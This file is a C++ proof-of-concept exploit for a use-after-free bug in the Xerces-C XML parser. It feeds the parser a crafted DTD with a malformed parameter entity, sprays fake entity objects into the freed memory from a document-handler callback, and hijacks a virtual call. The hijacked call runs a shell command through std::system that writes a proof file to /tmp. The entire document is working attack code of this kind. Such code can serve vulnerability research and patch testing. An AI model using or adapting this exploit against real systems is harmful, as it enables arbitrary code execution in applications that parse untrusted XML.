#include <xercesc/framework/MemBufInputSource.hpp>
#include <xercesc/framework/XMLDocumentHandler.hpp>
#include <xercesc/framework/XMLEntityDecl.hpp>
#include <xercesc/parsers/SAXParser.hpp>
#include <xercesc/sax/ErrorHandler.hpp>
#include <xercesc/sax/SAXParseException.hpp>
#include <xercesc/util/PlatformUtils.hpp>
#include <xercesc/util/XMLString.hpp>

#include <cstdlib>
#include <cstring>
#include <iostream>

using namespace xercesc;

static bool g_control_flow_hijacked = false;
static void* g_first_fake = nullptr;

class ReclaimedEntity final : public XMLEntityDecl {
    char pad[8];

public:
    explicit ReclaimedEntity(MemoryManager* const manager) : XMLEntityDecl(manager) {}

    bool getDeclaredInIntSubset() const override {
        g_control_flow_hijacked = true;
        return true;
    }

    bool getIsParameter() const override {
        std::cerr << "[+] control flow reached ReclaimedEntity::getIsParameter, this=" << this << "\n";
        std::system("/usr/bin/env sh -c 'printf xerces-uaf-rce > /tmp/xerces_uaf_rce_proof'");
        g_control_flow_hijacked = true;
        return true;
    }

    bool getIsSpecialChar() const override {
        g_control_flow_hijacked = true;
        return false;
    }
};

class ExploitDocumentHandler final : public XMLDocumentHandler {
    MemoryManager* const fMemoryManager;

public:
    explicit ExploitDocumentHandler(MemoryManager* const memoryManager)
        : fMemoryManager(memoryManager) {}

    void docCharacters(const XMLCh* const, const XMLSize_t length, const bool) override {
        std::cerr << "[*] docCharacters after DTDScanner destruction, len=" << length << "\n";

        if (g_first_fake)
            return;

        for (int i = 0; i < 8; ++i) {
            auto* fake = new (fMemoryManager) ReclaimedEntity(fMemoryManager);
            if (!g_first_fake)
                g_first_fake = fake;
            std::cerr << "[*] reclaim[" << i << "]=" << fake << "\n";
        }
    }

    void endEntityReference(const XMLEntityDecl& entityDecl) override {
        std::cerr << "[*] endEntityReference dangling entity=" << &entityDecl
                  << ", first reclaim=" << g_first_fake << "\n";

        const bool value = entityDecl.getIsParameter();
        std::cerr << "[*] virtual returned " << value << "\n";
    }

    void startElement(const XMLElementDecl&, const unsigned int, const XMLCh* const,
                      const RefVectorOf<XMLAttr>&, const XMLSize_t, const bool, const bool) override {
        std::cerr << "[*] startElement from propagated PE reader\n";
    }

    void endDocument() override {
        std::cerr << "[*] endDocument, hijacked=" << g_control_flow_hijacked << "\n";
    }

    void docComment(const XMLCh* const) override {}
    void docPI(const XMLCh* const, const XMLCh* const) override {}
    void endElement(const XMLElementDecl&, const unsigned int, const bool, const XMLCh* const = nullptr) override {}
    void ignorableWhitespace(const XMLCh* const, const XMLSize_t, const bool) override {}
    void resetDocument() override {}
    void startDocument() override {}
    void startEntityReference(const XMLEntityDecl&) override {}
    void XMLDecl(const XMLCh* const, const XMLCh* const, const XMLCh* const, const XMLCh* const) override {}
};

class QuietErrorHandler final : public ErrorHandler {
public:
    void warning(const SAXParseException&) override {}
    void error(const SAXParseException&) override {}

    void fatalError(const SAXParseException& exc) override {
        char* message = XMLString::transcode(exc.getMessage());
        std::cerr << "[fatal] " << message << "\n";
        XMLString::release(&message);
    }

    void resetErrors() override {}
};

int main() {
    XMLPlatformUtils::Initialize();

    std::cerr << "[*] sizeof(XMLEntityDecl)=" << sizeof(XMLEntityDecl)
              << ", sizeof(ReclaimedEntity)=" << sizeof(ReclaimedEntity) << "\n";

    const char* const xml =
        "<!DOCTYPE r [<!ELEMENT r ANY><!ENTITY% pe1 \">D><r>hello\">\n %pe1;";

    {
        SAXParser parser;
        ExploitDocumentHandler docHandler(XMLPlatformUtils::fgMemoryManager);
        QuietErrorHandler errHandler;

        parser.setValidationScheme(SAXParser::Val_Auto);
        parser.setDoNamespaces(true);
        parser.setExitOnFirstFatalError(false);
        parser.setValidationConstraintFatal(false);
        parser.installAdvDocHandler(&docHandler);
        parser.setErrorHandler(&errHandler);

        MemBufInputSource input(reinterpret_cast<const XMLByte*>(xml), std::strlen(xml), "poc", false);
        try {
            parser.parse(input);
        } catch (...) {
            std::cerr << "[*] parser threw after exploit path\n";
        }
    }

    XMLPlatformUtils::Terminate();
    return g_control_flow_hijacked ? 42 : 1;
}
